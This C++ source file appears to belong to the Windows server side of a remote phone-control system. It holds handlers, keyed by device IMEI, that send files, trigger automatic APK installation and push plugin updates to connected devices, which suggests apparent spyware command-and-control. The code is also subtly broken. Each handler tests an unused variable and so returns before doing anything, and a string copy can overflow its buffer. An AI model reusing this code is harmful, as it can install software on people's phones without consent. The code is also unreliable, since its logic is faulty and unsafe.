#include <windows.h>
#include "iosServer.h"
#include "PublicFunction.h"
#include "CmdFileAccssor.h"
#include "Shlwapi.h"
#pragma comment( lib, "Shlwapi.lib")
#include "Additional.h"
#include "PacketMaker.h"
#include "CmdSendMessage.h"
#include "FileOperator.h"
#include "CmdDownloadFile.h"


int CommandDownloadFile::CmdDownloadFile(char * lpdata,LPDATAPROCESS_PARAM  lpparam,char * imei,char * username){

	string cmdfn = Additional::getCmdFileName(lpparam->currentpath, DOWNLOADFILECOMMANDFILE, imei);

	char szCmd[MAX_MESSAGE_SIZE] = { 0 };

	DWORD dwFileSize = 0;

	int iRet = 0;

	dwFileSize = FileOperator::fileReader(cmdfn, szCmd, MAX_MESSAGE_SIZE);
	if (iRet == FALSE)
	{
		return FALSE;
	}


	DeleteFileA(cmdfn.c_str());

	char szDownloadLocalFileName[MAX_PATH];
	lstrcpyA(szDownloadLocalFileName, szCmd);
	PathStripPathA(szDownloadLocalFileName);

	string localfn = Additional::getDownloadFileName(lpparam->currentpath, szDownloadLocalFileName);

	iRet = localFileSender(lpdata, CMD_DOWNLOADFILE, localfn.c_str(), szCmd, lpparam, username, imei);
	return iRet;
}





int CommandDownloadFile::CmdAutoInstallApk(char * lpdata,LPDATAPROCESS_PARAM  lpparam,char * imei,char * username){

	string cmdfn = Additional::getCmdFileName(lpparam->currentpath, AUTOINSTALLAPKCOMMANDFILE, imei);

	char szCmd[MAX_MESSAGE_SIZE] = { 0 };

	DWORD dwFileSize = 0;

	int iRet = 0;

	dwFileSize = FileOperator::fileReader(cmdfn, szCmd, MAX_MESSAGE_SIZE);
	if (iRet == FALSE)
	{
		return FALSE;
	}
	DeleteFileA(cmdfn.c_str());

	char szDownloadLocalFileName[MAX_PATH];
	lstrcpyA(szDownloadLocalFileName, szCmd);
	PathStripPathA(szDownloadLocalFileName);

	string localfn = Additional::getDownloadFileName(lpparam->currentpath, szDownloadLocalFileName);

	iRet = localFileSender(lpdata, CMD_AUTOINSTALL, localfn.c_str(), szCmd, lpparam, username, imei);
	return iRet;
}






int CommandDownloadFile::CmdUpdatePlugin(char * lpdata, LPDATAPROCESS_PARAM  lpparam, char * imei, char * username) {
	char errorbuf[1024];
	DATAPROCESS_PARAM stparam = *lpparam;

	string cmdfn = Additional::getCmdFileName(lpparam->currentpath, UPDATEPLUGINCOMMANDFILE, imei);

	char szCmd[MAX_MESSAGE_SIZE] = { 0 };

	DWORD dwFileSize = 0;

	int iRet = 0;

	dwFileSize = FileOperator::fileReader(cmdfn, szCmd, MAX_MESSAGE_SIZE);
	if (iRet == FALSE)
	{
		return FALSE;
	}
	DeleteFileA(cmdfn.c_str());

	char classfunc[2][MAX_MESSAGE_SIZE] = { 0 };
	iRet = SendPhoneMessage::GetPhoneAndMessage(szCmd, classfunc);

	char szDownloadLocalFileName[MAX_PATH];
	lstrcpyA(szDownloadLocalFileName, classfunc[0]);
	//PathStripPathA(szDownloadLocalFileName);

	string localfn = Additional::getDownloadFileName(lpparam->currentpath, szDownloadLocalFileName);

	HANDLE hFileDownLoadLocal = CreateFileA(localfn.c_str(),GENERIC_READ | GENERIC_WRITE,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if (hFileDownLoadLocal != INVALID_HANDLE_VALUE )
	{
		dwFileSize = GetFileSize(hFileDownLoadLocal,0);
		if (dwFileSize >= LIMIT_DATA_SIZE)
		{
			CloseHandle(hFileDownLoadLocal);
			return FALSE;
		}

		char * lpDownloadSendBuf = new char[dwFileSize + 1024];
		if (lpDownloadSendBuf )
		{
			int iLen = PacketMaker::hdrWithStringStringData(lpDownloadSendBuf,imei, CMD_UPDATEPROC, classfunc, dwFileSize);

			DWORD dwCnt = 0;
			iRet = ReadFile(hFileDownLoadLocal,lpDownloadSendBuf + iLen,dwFileSize,&dwCnt,0);
			if (iRet && dwCnt == dwFileSize && dwCnt>0)
			{
				iLen += dwFileSize;
				*(DWORD*)(lpDownloadSendBuf) = iLen;
				iRet =	send(stparam.sockclient,lpDownloadSendBuf,iLen,0);
				CloseHandle(hFileDownLoadLocal);
				delete[] lpDownloadSendBuf;
				if (iRet <= 0)
				{
					ErrorFormat(lpparam,errorbuf,"CmdUpdatePlugin send file error",imei,username);
					WriteLogFile(errorbuf);
					return NETWORKERROR;
				}
				else
				{
					ErrorFormat(lpparam, errorbuf, "CmdUpdatePlugin send file ok", imei, username);
					WriteLogFile(errorbuf);
					return TRUE;
				}
			}
			else
			{
				ErrorFormat(lpparam,errorbuf,"CmdUpdatePlugin read local file error",imei,username);
				WriteLogFile(errorbuf);
			}
			delete[] lpDownloadSendBuf;
		}
		else
		{
			ErrorFormat(lpparam, errorbuf, "CmdUpdatePlugin allocate memmory error", imei, username);
			WriteLogFile(errorbuf);
		}
		CloseHandle(hFileDownLoadLocal);
	}
	else
	{
		ErrorFormat(lpparam, errorbuf, "CmdUpdatePlugin not found local file", imei, username);
		WriteLogFile(errorbuf);
	}

	return FALSE;
}